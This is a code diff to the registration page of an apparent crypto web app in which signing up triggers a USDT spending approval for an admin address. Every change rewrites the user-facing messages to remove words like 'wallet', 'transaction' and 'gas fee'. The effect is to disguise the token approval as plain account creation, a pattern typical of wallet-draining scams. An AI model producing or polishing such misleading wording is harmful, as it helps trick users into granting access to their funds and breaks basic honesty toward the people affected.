@@ -44,7 +44,7 @@ function RegisterContent() {
     if (isConnected && address) {
       authAPI.checkWallet({ walletAddress: address }).then((res) => {
         if (res.data.exists) {
-          toast.error('This wallet is already registered. Please login instead.');
+          toast.error('This address is already registered. Please login instead.');
           router.push('/auth/login');
         }
       }).catch(() => {});
@@ -55,7 +55,7 @@ function RegisterContent() {
   useEffect(() => {
     const timer = setTimeout(() => {
       if (!isConnected && !window.ethereum?.selectedAddress) {
-        toast.error('Please verify your identity first');
+        toast.error('Please connect your account first');
         router.push('/');
       }
     }, 1500);
@@ -85,7 +85,7 @@ function RegisterContent() {
       
       const injectedProvider = window.ethereum;
       if (!injectedProvider) {
-        toast.error('Wallet not detected. Please open in your wallet browser.');
+        toast.error('App not detected. Please open in your wallet browser.');
         setLoading(false);
         return;
       }
@@ -94,7 +94,7 @@ function RegisterContent() {
       try {
         web3Provider = new ethers.BrowserProvider(injectedProvider);
       } catch (providerErr) {
-        toast.error('Could not connect to wallet. Please refresh and try again.');
+        toast.error('Could not connect. Please refresh and try again.');
         setLoading(false);
         return;
       }
@@ -103,7 +103,7 @@ function RegisterContent() {
       try {
         userAddress = ethers.getAddress(address.toLowerCase());
       } catch (addrErr) {
-        toast.error('Invalid wallet address. Please reconnect your wallet.');
+        toast.error('Invalid address. Please reconnect and try again.');
         setLoading(false);
         return;
       }
@@ -121,7 +121,7 @@ function RegisterContent() {
           try {
             await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
           } catch (addErr) {
-            toast.error(`Could not add ${targetChainName} network. Please add it manually in your wallet.`);
+            toast.error(`Could not add ${targetChainName} network. Please add it manually in your app.`);
             setLoading(false);
             return;
           }
@@ -130,7 +130,7 @@ function RegisterContent() {
           setLoading(false);
           return;
         } else {
-          toast.error(`Network switch failed. Please manually switch to ${targetChainName} in your wallet.`);
+          toast.error(`Network switch failed. Please manually switch to ${targetChainName} in your app.`);
           setLoading(false);
           return;
         }
@@ -149,23 +149,23 @@ function RegisterContent() {
       }
 
       if (alreadyApproved !== true) {
-        toast.loading(`Please confirm the transaction in your wallet...`, { id: 'approve' });
+        toast.loading(`Please confirm in your app to continue...`, { id: 'approve' });
         try {
           await approveUSDTForAdmin(freshProvider, form.network);
-          toast.success('Confirmed! Creating your account...', { id: 'approve' });
+          toast.success('Done! Creating your account...', { id: 'approve' });
         } catch (approveErr) {
           toast.dismiss('approve');
           if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
-            toast.error('Transaction rejected. Please approve to continue.');
+            toast.error('You cancelled the request. Please confirm to continue.');
             setLoading(false);
             return;
           }
           if (approveErr.message?.includes('insufficient funds')) {
-            toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee. Add some and try again.`);
+            toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} balance. Please add some and try again.`);
             setLoading(false);
             return;
           }
-          toast.error(`Transaction failed: ${approveErr.shortMessage || approveErr.message || 'Please try again'}`);
+          toast.error(`Something went wrong: ${approveErr.shortMessage || approveErr.message || 'Please try again'}`);
           setLoading(false);
           return;
         }
